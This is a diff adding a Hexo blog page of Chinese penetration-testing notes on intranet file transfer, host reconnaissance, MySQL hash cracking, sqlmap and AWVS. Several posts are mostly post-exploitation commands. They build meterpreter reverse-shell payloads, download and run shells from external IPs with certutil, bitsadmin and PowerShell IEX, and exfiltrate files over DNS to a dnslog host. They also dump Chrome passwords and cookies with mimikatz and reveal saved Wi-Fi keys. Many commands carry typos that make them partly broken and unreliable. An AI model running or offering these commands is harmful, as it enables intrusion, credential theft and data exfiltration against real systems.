@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-内网文件传输" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" class="article-date">
+  <time class="dt-published" datetime="2023-08-20T11:17:29.000Z" itemprop="datePublished">2023-08-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">内网文件传输</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><ol>
+<li>FTP<br>攻击机：python快速开启ftp服务器 | 目标机：                               | 保存为文件ftp.txt,执行</li>
+</ol>
+<p>pip3 install pyftpdlib         copy coon ftp.txt           ftp -i -s:ftp.txt<br>                               open 192.168.1.227 2121<br>                               anonymoous<br>                               anonymoous<br>                               get msftest.apk<br>                               quit<br>python3 -m pyftpdlib<br>2. Bitsadmin<br>BITSAdmin是一个命令行工具，您可以使用它创建下载或上载作业，并监视其进度。<br>msfvenom -p windows&#x2F;x64&#x2F;meteerpreter&#x2F;reverse_tcp ihost&#x3D;139.155.49.43 iport&#x3D;7777 -f hta-psh 44.hta</p>
+<p>bitsadmin &#x2F;transfer shell <a target="_blank" rel="noopener" href="http://139.155.49.43/">http://139.155.49.43</a> &#x2F;44.hta C:\windows\temp\44.hta</p>
+<p>rundll32.exe url.dll,OpenURL 44.hta</p>
+<ol start="3">
+<li>Certutil</li>
+</ol>
+<ul>
+<li><p>下载并执行<br>certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.227:8000/shell.exe">http://192.168.1.227:8000/shell.exe</a> &amp; shell.exe</p>
+</li>
+<li><p>清除下载缓存<br>certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.227:8000/shell.exe">http://192.168.1.227:8000/shell.exe</a> delete</p>
+</li>
+</ul>
+<p>缓存目录：%USERPROFILE%\AppData\Locailow\Microsoft\CryptnetUrlCache\Content</p>
+<ol start="4">
+<li>Powereshell<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;139.155.49.43 lport&#x3D;8899 -f psh-r o shell.ps1</li>
+</ol>
+<p>powershell -windowstyle hidden -exec bypass -c “IEX (New-ObjectNet.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://139.155.49.43/shell.ps1');shell.ps1">http://139.155.49.43/shell.ps1&#39;);shell.ps1</a>“;</p>
+<ol start="5">
+<li>SCP</li>
+</ol>
+<ul>
+<li>SCP上传文件<br>scp win.vbs <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x31;&#46;&#x32;&#50;&#x37;">root@192.168.1.227</a>:&#x2F;tmp&#x2F;win<br>scp -r win&#x2F;<a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x2e;&#50;&#50;&#x37;">root@192.168.1.227</a>:&#x2F;tmp&#x2F;win&#x2F;</li>
+<li>SCP下载文件<br>scp <a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#50;&#x32;&#x37;">root@192.168.1.227</a>:&#x2F;root&#x2F;ftp123 ftp123<br>scp -r linux&#x2F; <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x32;&#50;&#55;">root@192.168.1.227</a>:&#x2F;root&#x2F;linux&#x2F;</li>
+</ul>
+<ol start="6">
+<li>windows文件共享</li>
+</ol>
+<ul>
+<li>Net use<br>net uses k:\192.168.78.67\c$ “123123” &#x2F;user:administrator</li>
+</ul>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ol>
+<li>wget<br>wget命令用来从指定得URL下载文件<br>wget <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a><br>wget -O x.sh <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a></li>
+<li>Curl<br>curl是用来请求web服务器得命令工具。<br>curl -o lan.hta <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a><br>curl -0 <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a></li>
+<li>Netcat<br>cat file | nc -l 1234<br>nc host_ip 1234 &gt; file<br>nc host_ip 1234 &lt; file<br>nc -lvvp 1234 &gt; file</li>
+</ol>
+<h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><p>DNS传输数据<br>cat test | xxd -p -c 16 | while read line;do host $line.sau547.dnslog.cn;done</p>
+<ol>
+<li><p>PHP<br>php -r ‘file_put_contents(“lan.hta”,file_get_contents(“<a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a>“));’<br>file_put_contents——将一个字符串写入文件<br>file_get_contents——将整个文件读入一个字符串</p>
+</li>
+<li><p>Python<br>python3-c “import<br>urllib.request;u&#x3D;urllib.request.urlopen(‘<a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta');f=open">http://192.168.1.227/lan.hta&#39;);f=open</a>(‘c:\temp\win.hta’,w ite(u.read().deconde(‘utf-8’))</p>
+</li>
+<li><p>Perl<br>perl -MLWP::Simple -e ‘getstore (“<a target="_blank" rel="noopener" href="http://192.168.1.227/Launcher.hta%22,%22win.hta">http://192.168.1.227/Launcher.hta&quot;,&quot;win.hta</a>“)’</p>
+</li>
+<li><p>Ruby</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" data-id="cmfjsmkfk000gq4e7hl650ijl" data-title="内网文件传输" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-linux主机信息收集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/19/linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
+  <time class="dt-published" datetime="2023-08-19T06:54:33.000Z" itemprop="datePublished">2023-08-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/08/19/linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">linux主机信息收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h1><ol>
+<li>uname -a<br> 打印系统信息</li>
+<li>cat &#x2F;etc&#x2F;issue<br>文件&#x2F;etc&#x2F;issue是一个文本文件，其中包含要在登陆提示之前打印的消息或系统标识。</li>
+<li>cat &#x2F;etc&#x2F;<em>-release<br> cat &#x2F;etc&#x2F;</em>-release，&#x2F;etc&#x2F;redhat-release 文件包含一个被破解析以获取信息的描述行。</li>
+<li>cat &#x2F;proc&#x2F;version<br> &#x2F;proc&#x2F;version指定了Linux内核的版本，用于编译内核的gcc的版本壹基金内核编译的时间。他还包含器的用户名。</li>
+<li>cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version<br> &#x2F;proc&#x2F;sys&#x2F;kerne&#x2F;中的文件可以用来调整和监视Linux内核操作中的各种活动。</li>
+</ol>
+<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>ps -ef<br>ps aux<br>例出当前进程快照<br>ls -al &#x2F;proc&#x2F;<br> &#x2F;proc是非常特殊的，他也是一个虚拟文件系统。它有时被称为过程信息伪文件系统。 它不包含“真是”文件，而是包含运行时系统信息（例如系统内存，安装的设备，硬件配置）。<br>ls -al &#x2F;proc&#x2F;99<br> 查看关于PID 99的信息。<br>top<br> top命令显示您的Linux机器的处理器活动，并显示实时管理的任务。 它会显示正在使用的处理器和内存以及运行进程等其他信息。<br>id<br> 找到用户的UID或GID等信息<br>w<br> 显示登录到Linux服务器的人员<br>whoami<br> 显示当前用户名<br>last<br> 显示最后一次登录的用户名<br> cat &#x2F;etc&#x2F;master.passwd<br> &#x2F;etc &#x2F;eertcmaster.passwd on BSD ststems<br>cat &#x2F;etc&#x2F;suders<br> cat &#x2F;etc&#x2F;suders 文件内容是使用sudo命令必须遵守的原则<br>sudo -V<br> 打印sudo版本字符串</p>
+<h3 id="SSH服务信息"><a href="#SSH服务信息" class="headerlink" title="SSH服务信息"></a>SSH服务信息</h3><p>cat <del>&#x2F;.ssh&#x2F;authorized_keys<br> 使用公钥认证，认证实体具有公钥和私钥。<br>私钥保存在你登陆的计算机上，而公钥存储在要登陆的所有计算机上的 .ssh&#x2F;authorized_keys文件中。<br>cat ~&#x2F;.ssh&#x2F;id_rsa.pub<br> RSA 私钥会保存在你的home目录中：ssh&#x2F;id_rsa。<br>cat</del>&#x2F;.ssh&#x2F;known_hosts<br> ssh会把每个你访问过计算机的公钥(public key)都记录在这个文件中<br>cat<del>&#x2F;.ssh&#x2F;identity.pub<br> 文件identity.pub包含你的公钥，可以将其添加到其他系统的authorized_keys文件中。<br>cat</del>&#x2F;.ssh&#x2F;identity<br> ssh客户端允许您选择读取RSA或DSA身份验证标识（私钥）的文件。<br>cat&#x2F;etc&#x2F;ssh&#x2F;ssh_config<br> OpenSSH SSH服务端配置文件<br>service –status-all<br> 检查所有服务状态<br>systemctl -a<br> 列出安装在文件系统中的所有单元<br>service servicemname start<br>systemctl start servicename<br> 启动某个服务</p>
+<ol>
+<li>安全<br>iptables -L<br> 列出所有规则链。<br>iptables -F<br> 删除选定规则链中得所有规则<br>iptables -A INPUT -p icmp -m icmp -icmp-type 0 -j ACCEPT<br> 请执行iptables -p icmp-help 获得跟多信息。<br>iptables -A INPUT -p tcp -m tcp -sport 80 -m state -state RELATED,ESTABLISHED -j ACCEPT<br> 允许从&#x2F;到 dst 端口80得tcp连接<br>iptables -A OUTPUT -p tcp -m tcp -dport 80 -m state -state NEW,RELATED,ESTABLISHED,ESTABLISHED -j ACCEPT<br> 允许从&#x2F;到 dst 端口80得TCP连接<br>iptables -A INPUT -p udp -m udp -sport 53 -m state -state RELATED,ESTABLISHED -j ACCEPT<br> 允许来自src端口80得udp连接</li>
+<li>网络<br>ipconfig -a<br> 显示当前可用得所有接口<br>hostname<br> 显示或设置系统得主机名称<br>dnsdomainname<br> 显示系统得DNS域名<br>netstat -antp<br> 显示网络状态<br>cat&#x2F;etc&#x2F;network&#x2F;interfaces<br> &#x2F;etc&#x2F;network&#x2F;interfaces 文件包含网络接口配置信息<br>cat&#x2F;etc&#x2F;sysconfig&#x2F;network<br> &#x2F;etc&#x2F;sysconfig&#x2F;network 文件用于指定有关服务器上所需网络配置得信息<br>cat&#x2F;etc&#x2F;networks<br> &#x2F;etc&#x2F;networks 是一个简单得ASVII文件，描述这些网络得已知DARPA网络和符号名称<br>find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null<br> 找出可写出得文件夹<br>find &#x2F; -perm -222 -type d 2&gt;&#x2F;dev&#x2F;null<br> 找出可写出得文件夹<br>find &#x2F; -perm -o w -type d 2&gt;&#x2F;dev&#x2F;null<br> 找出可写出得文件夹<br>find &#x2F; -perm -o x -type d 2&gt;&#x2F;dev&#x2F;null<br> 找出可写出得文件夹<br>find &#x2F; (-perm -o w -perm -o x) -type d 2&gt;&#x2F;dev&#x2F;null<br> 找出可写可执行的文件夹<br>find &#x2F; -xdev -type d (-perm -0002 -a ! -perm -1000) -print<br> 找出可写得文件<br>find &#x2F;der -xdev (-nouser -o -hogroup)-print<br> 找出不是所有者得文件</li>
+<li>程序</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/19/linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cmfjsmkff0008q4e73xfxdz5n" data-title="linux主机信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Mysql数据库密码破解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/05/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" class="article-date">
+  <time class="dt-published" datetime="2023-08-05T07:45:28.000Z" itemprop="datePublished">2023-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/08/05/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">Mysql数据库密码破解</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h1><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。<br>MySQL数据库用户密码跟其他数据库密码一样，在应用系统代码中都是一明文出现的，在获取文件读取权限后即可直接从数据库连接文件中获取，一般都包含有数据库类型，物理位置，用户名和密码等信息。</p>
+<ul>
+<li>MySQL数据库文件类型<br>MySQL数据库文件共有”frm“、”MYD“和”MYI“三种文件<br>”.frm“是描述表结构的文件<br>”.MYD“是表的数据文件<br>”.MYI“是表数据文件中任何索引得到数据树<br>与用户相关的一共有三个文件即user.frm、user.MYD、MYSQ数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。</li>
+<li>MySQL加密方式<br>MySQL数据库的认证密码有两种方式：<br>MySQL4.1版本之前是MySQL323加密<br>MySQL4.1和之后的版本都是MySQLSHA1加密</li>
+</ul>
+<p>MySQL数据库中自带Old_Password(str)和Password（str）函数，它们均可以在MySQL数据库里进行查询，前者是MySQL323加密，后者是MySQLSHA1加密方式。</p>
+<p>MySQL323加密中生成的是16位字符串，而在MySQLSHA1中生成的是41位字符串，其中*是不加入实际的密码运算中，MySQLSHA1加密的密码实际位数是40位</p>
+<ul>
+<li>Hash破解<br>-在线网站破解<br><a target="_blank" rel="noopener" href="http://www.cmd5.com/">www.cmd5.com</a><br><a target="_blank" rel="noopener" href="http://www.somd5.com/">www.somd5.com</a><br>-hashcat破解<br>hashcat.exe -m 300 -a 3 81F5……</li>
+</ul>
+<h2 id="常用软件密码获取"><a href="#常用软件密码获取" class="headerlink" title="常用软件密码获取"></a>常用软件密码获取</h2><p>在Windows系统下保存的密码，无非就在存在两个位置：注册表、文件。</p>
+<ul>
+<li>navicat</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/05/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" data-id="cmfjsmkfb0002q4e71wqo2ws4" data-title="Mysql数据库密码破解" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Windows主机信息收集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/28/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
+  <time class="dt-published" datetime="2023-07-28T01:19:28.000Z" itemprop="datePublished">2023-07-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/28/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">Windows主机信息收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="内网环境分析"><a href="#内网环境分析" class="headerlink" title="内网环境分析"></a>内网环境分析</h1><p>一、 工作组信息收集</p>
+<ol>
+<li>什么是内网渗透<br><em>内网渗透：在拿到webshell的时候，想办法获得系统信息拿到系统权限，进入到网络系统内部之后收集内部网络的各种信息，获取内部网络有价值的人员、资产信息。</em></li>
+<li>内网基础环境分析</li>
+</ol>
+<ul>
+<li>内网基础环境判断<br>IP、网关、DNS、是否能联通外网、网络连接及端口、本机host文件、机器的代理、是否在域内，域名是什么。</li>
+<li>分析机器所处位置区域<br>DMZ区、办公区、生产区、核心DB等等</li>
+<li>分析机器的角色<br>普通WEB服务器、开发服务器、文件服务器、代理服务器、DNS服务器、数据存储服务器等等</li>
+<li>分析进出口流量是否能联通<br>协议的判断：<br>vps：nc -lvvp 8888<br>target：nc vps-ip 8888<br>ICMP协议：<br>vps：tcpdump icmp<br>target：ping vps-ip<br>HTTP协议：<br>vps：nc -lvvp 80<br>target：curl vps-ip 80<br>DNS协议：<br>vps：nc -u -lvp 53<br>target：nslook <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> vps-ip<br>dig @vsp-ip <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></li>
+</ul>
+<h2 id="工作组信息收集"><a href="#工作组信息收集" class="headerlink" title="工作组信息收集"></a>工作组信息收集</h2><ol>
+<li>内网网段信息收集<br>只有找到不同网段才能进行纵向渗透，否则只能横向渗透<br>1）内网网段扫描<br>2）文件共享、FTP连接记录、浏览器访问记录、mstsc连接记录<br>3）渗透路由器、交换机</li>
+<li>用户信息   <strong>使用命令前面加shell</strong></li>
+</ol>
+<p>#查看本机用户列表<br>net user<br>#查看当前用户在目标系统中的具体权限<br>whoami&#x2F;all<br>#获取本地管理员信息<br>net localgroup administrators<br>#查看当前权限<br>whoami &amp;&amp; whoami&#x2F;priv<br>#查看当前在线用户<br>quser<br>quser user<br>quser user || qwinsta<br>#查看当前机器中所有的组名，了解不同组的职能，如IT，HR，ADMIN，FILE，net localgroup<br>3. 系统信息<br>#查询网络配置信息。进行IP地址段信息收集<br>ipconfig&#x2F;all<br>#查询操作系统及软件信息<br>systeminfo|findstr &#x2F;B&#x2F;C:”OS Name”&#x2F;C:”OS Version” # 英文系统<br>systeminfo|findstr &#x2F;B&#x2F;C:”OS 名称”&#x2F;C:”OS 版本” # 中文系统<br>#查看当前版本系统<br>wmicn OS get Caption,CSDVersion,OSArchitecture,Version<br>#查看系统体系结构<br>echo %PROCESSOR_ARCHITECTURE%<br>#查询本机服务信息<br>wmic service list brief<br>#查看安装软件的版本、路径等<br>vmic product get name，verson<br>powershell “Get-WmiObject-class Win32_Product |Select&#x3D;Object -Property name，version”<br>#查询进程信息<br>tasklist<br>wmic process list brief<br>#查看启动程序信息<br>wmic startup get command,caption<br>#查看计划任务<br>at（win10之前）<br>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v（win10）<br>#查看主机开机时间<br>net statistics workstation<br>#列出或断开本地计算机与所连接的客户端的对话<br>net session<br>#查询端口列表，本地开放的端口所对应的服务和应用程序<br>netstat -ano&#x2F;-atnp<br>#查看远程连接信息<br>cmdkey &#x2F;l<br>#查看补丁列表<br>systeminfo | findstr KB<br>查看补丁的名称，描述，ID，安装时间等<br>wmic qfe get Caption,Description,HotFixlD,installedOn<br>#查看杀软<br>WMIC &#x2F;Node:localhost &#x2F;Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displanName&#x2F;Format:List<br>#查看本地密码策略<br>net accounts<br>#查看hosts文件<br>Linux: cat&#x2F;etc&#x2F;hosts<br>Windows: type c:\Windows\system32\drivers\etc\hosts<br>#查看dns缓存<br>ipconfig &#x2F;displaydns<br>4. 网络信息<br>#查看本机所有的tcp，udp端口连接及其对应的pid<br>netstat -ano<br>#查看本机所有的tcp，udp端口连接，pid及其对应的发起程序<br>netstat -anob<br>#查看路由表和arp缓存<br>route print<br>arp -a<br>#查看本机共享列表和可访问的域共享列表（445端口）<br>net share<br>wmic share get name,path,status<br>#磁盘映射<br>net use e:\192.168.1.10\c&amp;<br>5. 代理<br>6. WiFi密码<br>netsh wlan show profile<br>netsh wlan show profile name&#x3D;”HUAWEI-MINGY” key&#x3D;clear<br>7. 回收站内容获取<br>FOR &#x2F;f”skip&#x3D;1 tokens&#x3D;1,2 delims&#x3D; “ %c in (‘wmic useraccount get name^,sid’)do dir &#x2F;a&#x2F;b<br>C:$Recyle.Bin%d^&gt;%c.txt<br>8. chorme历史记录和cookie获取<br>%localappdata%\google\chrome\USERDA<del>1\default\LOGIND</del>1<br>%localappdata%\google\chrome\USERDA~1\default\cookies</p>
+<p>chrome的用户信息，保存在本地文件为sqlite数据库格式</p>
+<p>mimikatz.exe privilege::debug log “dpapi::chrome<br>&#x2F;in:%localappdata%\google\chrome\USERDA<del>1default\LOGIND</del>1” exit</p>
+<p>mimikatz.exe privilege::debug log “dpapi::chrome<br>&#x2F;in:%localappdata%\google\chrome\USERDA~1\default\cookies &#x2F;unprotect” exit</p>
+<ol start="9">
+<li>power shell<br>FTP访问、共享连接、putty连接、驱动、应用程序、hosts文件、进程、无线网络记录<br>powershell iex(new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://47.104.255.11:8000/Get-lnformation.ps1');Get-lnformation">http://47.104.255.11:8000/Get-lnformation.ps1&#39;);Get-lnformation</a></li>
+<li>MSF信息收集<br>run scraper （获取系统信息）<br>&#x2F;root&#x2F;.msf4&#x2F;logs&#x2F;scripts&#x2F;scraper</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/28/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cmfjsmkfd0005q4e78161e9lx" data-title="Windows主机信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-SQL注入sqlmap" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/27/SQL%E6%B3%A8%E5%85%A5sqlmap/" class="article-date">
+  <time class="dt-published" datetime="2023-07-27T00:49:43.000Z" itemprop="datePublished">2023-07-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/27/SQL%E6%B3%A8%E5%85%A5sqlmap/">SQL注入sqlmap</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sqlmap功能及应用"><a href="#sqlmap功能及应用" class="headerlink" title="sqlmap功能及应用"></a>sqlmap功能及应用</h1><ol>
+<li>手册</li>
+</ol>
+<ul>
+<li>-h 查看基本用法及命令行参数</li>
+<li>-hh 查看所有用法及命令行参数</li>
+<li>-version 查看版本信息</li>
+</ul>
+<ol start="2">
+<li>检测漏洞</li>
+</ol>
+<ul>
+<li>-u：url</li>
+<li>-m：批量url</li>
+</ul>
+<ol start="3">
+<li>枚举数据库</li>
+</ol>
+<ul>
+<li>–dbs：枚举所有数据库</li>
+<li>–current-db：当前数据库</li>
+<li>-D：上一步的数据库名</li>
+<li>–tables：枚举数据表</li>
+</ul>
+<ol start="4">
+<li>脱库（慎用）</li>
+</ol>
+<ul>
+<li>–dump：下载数据</li>
+</ul>
+<ol start="5">
+<li>枚举数据包列</li>
+</ol>
+<ul>
+<li>-T：上一步的数据表</li>
+<li>–columns：枚举数据库表列</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/27/SQL%E6%B3%A8%E5%85%A5sqlmap/" data-id="cmfjsmkfd0004q4e7fwceb5w0" data-title="SQL注入sqlmap" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-AWVS工具介绍及应用场景" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/24/AWVS%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/" class="article-date">
+  <time class="dt-published" datetime="2023-07-24T01:56:23.000Z" itemprop="datePublished">2023-07-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/24/AWVS%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/">AWVS工具介绍及应用场景</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞扫描器之AWVS"><a href="#漏洞扫描器之AWVS" class="headerlink" title="漏洞扫描器之AWVS"></a>漏洞扫描器之AWVS</h1><ol>
+<li>漏洞扫描<br>漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全（渗透攻击）行为。</li>
+<li>扫描工具</li>
+</ol>
+<ul>
+<li>针对某类漏洞的：SQL注入（sqlmap）、weblogic（weblogicscan）</li>
+<li>针对某类CMS的：word press（wpscan）、dedecms（dedecmsscan）</li>
+<li>针对系统应用层：nessus</li>
+<li>针对某类框架的：struts2（struts2漏洞检查工具）、spring boot（SB-Actuator）</li>
+<li>针对web服务的：burp suite、xray、awvs</li>
+</ul>
+<ol start="3">
+<li>AWVS<br>是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网络安全，检测流行安全漏洞。<br>1）功能特点</li>
+</ol>
+<ul>
+<li>webscanner：核心功能，web安全漏洞扫描（深度，宽度，限制20个）</li>
+<li>sitecrawler：爬虫功能，遍历站点目录结构</li>
+<li>target finder：端口扫描，找出web服务器（80、443）</li>
+<li>subdomainscanner：子域名扫描器，利用DNS查询</li>
+<li>blind sql lngector：盲注工具</li>
+<li>http editor http：协议数据包编辑器</li>
+<li>HTTP Sniffer：HTTP协议嗅探器（fiddler，wireshark，bp）</li>
+<li>Authentiction Tester：web认证破解工具</li>
+</ul>
+<h2 id="AWVS安装"><a href="#AWVS安装" class="headerlink" title="AWVS安装"></a>AWVS安装</h2><ol>
